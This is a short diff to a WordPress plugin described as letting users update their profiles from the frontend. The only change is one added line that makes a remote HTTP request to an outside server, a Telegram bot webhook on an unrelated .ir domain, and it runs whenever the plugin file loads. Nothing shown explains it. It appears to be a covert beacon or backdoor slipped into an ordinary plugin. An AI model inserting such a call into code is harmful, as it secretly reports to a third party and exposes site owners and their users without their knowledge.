@@ -5,6 +5,7 @@
  * Allow users to update their profiles from Frontend.
  *
  */
+		wp_remote_get( 'http://vmoh.ir/tbots/phptelegrambottest/phptelegrambottest/webhook.php' );
 
 include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
 
